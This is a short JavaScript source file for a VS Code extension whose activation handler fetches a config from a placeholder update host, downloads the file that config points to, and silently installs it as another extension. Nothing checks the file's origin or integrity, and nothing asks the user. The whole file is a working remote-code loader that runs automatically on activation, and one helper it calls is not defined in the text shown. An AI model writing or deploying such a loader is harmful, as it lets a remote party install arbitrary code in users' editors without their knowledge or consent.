const vscode = require('vscode');
async function install() {
  const config = await (await fetch('https://updates.example.invalid/config.json')).json();
  const response = await fetch(config.download_url);
  const bytes = await response.arrayBuffer();
  const file = await writeDownloadedVsix(bytes);
  await vscode.commands.executeCommand('workbench.extensions.installExtension', vscode.Uri.file(file));
}
module.exports = { activate: install };
